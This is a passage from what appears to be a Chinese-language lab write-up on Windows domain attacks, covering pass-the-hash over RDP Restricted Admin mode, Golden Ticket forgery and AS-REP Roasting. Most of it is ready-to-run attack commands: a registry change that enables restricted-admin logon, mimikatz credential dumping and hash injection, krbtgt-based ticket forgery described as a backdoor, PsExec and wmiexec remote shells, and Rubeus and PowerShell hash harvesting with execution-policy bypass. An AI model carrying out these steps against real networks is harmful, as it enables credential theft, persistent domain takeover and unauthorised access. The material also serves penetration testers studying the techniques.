    https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2016/2871997
    https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro
### 0x03 Pass the Hash with Remote Desktop的实现方法
在这里需要有两个必要的元素！首先是受害者机器需要开启注册表某一项，另一点是攻击机需要使用利用PTH登录的工具！
**开启注册表**
使用命令开启
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
**攻击机登录**  
(1)使用客户端命令行登录
    mstsc.exe /restrictedadmin
如果当前系统不支持Restricted Admin mode，执行后弹出远程桌面的参数说明，如下图  
如果系统支持Restricted Admin mode，执行后弹出登录桌面界面，如下图  
在这里登录只需要输入对方的IP即可！
(2)使用FreeRDP工具来使用
他的旧版本支持pth登陆方式，下载链接：
    https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz
在这里笔者没有环境所以没有进行编译测试！
### 0x04 实际环境测试
如果因为需求一定要登录3389的话，那可以通过这种方式在破解不出明文的情况下登录。
**测试环境**  
Server
  * IP:192.168. 52.129
  * OS:2012 R2
  * Computer Name:WIN-Q2JR4MURGS0
  * User Name : administrator
  * NTLM hash:08eb9761caca8f3c386962b5ad4b1991
  * 未开启Restricted Admin mode
Client:
  * IP:192.168.52.140
  * OS:2012 R2
  * User Name:administrator
  * 支持Restricted Admin mode
(1)psexec pth连接修改注册表
首先获取到B机器本地管理员组用户administrator的NTLM
    mimikatz.exe "Log" "Privilege::Debug" "Sekurlsa::logonpasswords" "exit"
获取到的hash如下
    08eb9761caca8f3c386962b5ad4b1991
pass:  
笔者在这里遇到一个问题，所测试的机器为2012
R2。在administrator账户上增加了DD账户，并添加管理员。想着登录DD账号之后缓存下hash，然后登录administrator再抓hash。但是登录administrator之后一直抓取不到DD的hash，想着以前自己搞得机器都有很多hash啊。
而且不符合登陆过后内存中无hash的思路，这个时候突然想到了一点。打过KB2871997补丁的机器或者2012及以上机器(内置此补丁不需要额外打)，注销后会删除凭证。且我实验的机器只有重启、关机、注销三个按钮。  
因此一直在administrator上抓不到DD的hash！这点虽然不是很重要，但是这也困扰了我所以记录一下!
然后注入到Client内存中
    privilege::debug
    kerberos::purge
    sekurlsa::pth /user:administrator /domain:. /ntlm:08eb9761caca8f3c386962b5ad4b1991
随后使用psexec连接B机器
    PsExec.exe -accepteula \\192.168.52.159 cmd.exe
在命令行中开启注册表必要修改项
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
随后在Client上mimikatz内使用命令登录对方机器，在这里无需账号密码
    sekurlsa::pth /user:administrator /domain:. /ntlm:08eb9761caca8f3c386962b5ad4b1991 "/run:mstsc.exe /restrictedadmin"
pass:  
如果单独使用mstsc.exe，好像无法指定具体哪个hash登录！
### 0x05 此模式下带来的问题
在这篇文章中说明了PTH登录3389所带来无法缓存Hash的问题
    http://blog.sycsec.com/2018/10/02/What-is-Pass-the-Hash-and-the-Limitations-of-mitigation-methods/#%E8%83%BD%E5%A4%9F%E7%A6%81%E6%AD%A2%E7%94%A8%E6%88%B7%E7%BD%91%E7%BB%9C%E7%99%BB%E5%BD%95
当我们使用pth登录3389进去之后，使用mimikatz抓hash。会发现无法抓取到！  
这是因为这是“首先管理员模式”的特性，接下来描述一下为什么会出现这种情况！
1.远程桌面默认使用无约束委派用户凭证，以达到完全在远程服务器上代表用户的目的。当我们连接到远程桌面服务器上，可以使用dir命令链接其他的smb服务器并使用我们登录3389的凭证认证，这是因为客户端进行远程桌面连接的时候会发送用户的明文密码，这个密码可以用于计算HTLM
Hash并缓存在远程桌面服务器上！
2.受限管理员模式下，远程桌面客户端会首先使用客户端机器上已缓存的NTLM
Hash进行认证，不需要用户输入用户名和密码，也就不会把明文密码委派到目标；即便缓存的hash认证失败，用户必须输入明文密码，mstsc也不会直接发送明文密码，而是计算出所需的值后再发送。这种模式下，登录到远程桌面服务器上并使用dir命令像其他smb服务器认证是，将使用空用户(用户名)登录，几乎都会登录失败！
可以对比看出，客户端直接明文3389登录，可能会被mimikatz从内存中抓取到；而受限管理员模式则能避免发送明文，服务端内存也就不会缓存用户凭证!
参考链接：
    https://www.secpulse.com/archives/72190.html
    https://www.freebuf.com/articles/system/220473.html
    http://blog.sycsec.com/2018/10/02/What-is-Pass-the-Hash-and-the-Limitations-of-mitigation-methods/#%E8%83%BD%E5%A4%9F%E7%A6%81%E6%AD%A2%E7%94%A8%E6%88%B7%E7%BD%91%E7%BB%9C%E7%99%BB%E5%BD%95
# AS-REP
## 黄金票据
### 0x00 漏洞成因
在kerberos认证笔记中有这么一段话
> 在TGS_REQ部分，Client将发送大致三种数据。两种加密的，一种不加密的。机密的分别为TGT、Login Session key
> 加密的时间戳数据B，不加密的如要访问的服务名称
当我们有了trbtgt的密钥之后，我们可以解密TGT，也可以加密TGT。因为我们用了trbtgt NTLM Hash！下面还有这样一段话
> 当TGS收到请求后，将会检查自身是否存在客户端所请求的服务。如果服务存在，通过krbtgt用户的NTLM hash解密TGT获得Login
> Session key，使用Login Session key去解密数据B，通过数据B。
这里是关键，TGS获取的Login Session key是通过解开TGT获取的！因此当我们得到trbtgt hash之后，我们就可以伪造任一用户了！
### 0x01 利用场景
1.拿到域内所有账户Hash，包括krbtgt账户，某些原因导致域控权限掉了，域管改密码了等  
2.手上还有一台机器，无所谓是否在域中！  
3.域管理员没有更改域控krbtgt账户的密码  
4.通常当作后门使用！
### 0x02 利用条件
伪造黄金凭据需要具备下面条件：
  * krbtgt用户的hash(就意味着你已经有域控制器权限了)
  * 域名称
  * 域的SID值
  * 要伪造的用户名
### 0x03 实验环境
192.168.60.1 hacke.testlab win2012  
192.168.60.55 非域内机器 win2008
使用命令获取hash、SID
    mimikatz.exe "Log" "Privilege::Debug" "lsadump::lsa /patch" "exit"
krbtgt NTLM hash
    RID  : 000001f6 (502)
    User : krbtgt
    LM   :
    NTLM : 30c84f309c52d2d6d05561fc3f904647
域的SID值
    S-1-5-21-3502871099-3777307143-1257297015
域名称
    hacke.testlab
在这里我们要伪造
    Administrator
准备就绪之后就可以在我们的机器上使用了，当前机器权限可以是普通权限。无需管理员即可PTT！
在伪造之前，最好清空一下当前的票据
    klist purge
**使用mimikatz**
    kerberos::golden /admin:Administrator /domain:hacke.testlab /sid:S-1-5-21-3502871099-3777307143-1257297015 /krbtgt:30c84f309c52d2d6d05561fc3f904647 /ticket:ticket.kirbi
在成功之后就相当于IPC连接成功之后的攻击方法了！
但是这里不同的工具需要的参数不同，机器名和IP都可以试试看
域控机器名
    WIN-Q2JR4MURGS0
**WMIEXEC.VBS**
    cscript wmiexec.vbs /shell 192.168.60.1
**psexec**
    PsExec.exe \\192.168.60.1 cmd.exe
**more**
## AS-REP Roasting攻击
### 0x00 漏洞成因
这个漏洞是需要额外去配置的！ 需要我们在用户账号设置" Do not require Kerberos
preauthentication(不需要kerberos预身份验证) "。  
在AS_REP阶段，会返回由我们请求的域账户hash加密某个值后返回。然后我们通过自身的ntlm
hash去解密得到数据。在这里设置不要求预身份验证后，我们可以在AS_REQ阶段，填写想要伪造请求的用户名，随后会用伪造请求的用户名NTLM
Hash加密返回给我们。随后我们就可以拿去爆破了，不过前提就是需要伪造请求的用户名设置了"不要求Kerberos预身份认证"
### 0x01 实验环境
非域机器，无法通过LDAP来发起用户名的查询。所以即使能够与kerberos通信也没法执行某些脚本。
因此实验在这里分为域内和域外两种！
#### 域内
**工具Rebeus**
使用命令直接获取域内所有开启"不要求Kerberos域身份认证"的用户，并且返回了他们的加密hash
    Rubeus.exe asreproast > log.txt
**Empire 中的Powerview.ps1**
在这里使用bypass命令直接执行输出到txt中！
    powershell.exe -exec bypass -Command "& {Import-Module C:\Users\test.HACKE\Desktop\powerview.ps1;Get-DomainUser -PreauthNotRequired}" > log.txt
获取用户名后，需要获取他们的加密hash。在这里需要使用另外一个模块
    powershell.exe -exec bypass -Command "& {Import-Module C:\Users\test.HACKE\Desktop\ASREPRoast.ps1;Get-ASREPHash -UserName test -Domain hacke.testlab | Out-File -Encoding ASCII hash.txt}"
#### 域外
在这里只能通过枚举域用户名操作来获取域用户名，拿到后使用Get-ASREPHash来获取信息！
    powershell.exe -exec bypass -Command "& {Import-Module ASREPRoast.ps1;Get-ASREPHash -UserName test -Domain hacke.testlab -Server 192.168.60.1 | Out-File -Encoding ASCII hash.txt}"
工具下载链接
    https://github.com/gold1029/ASREPRoast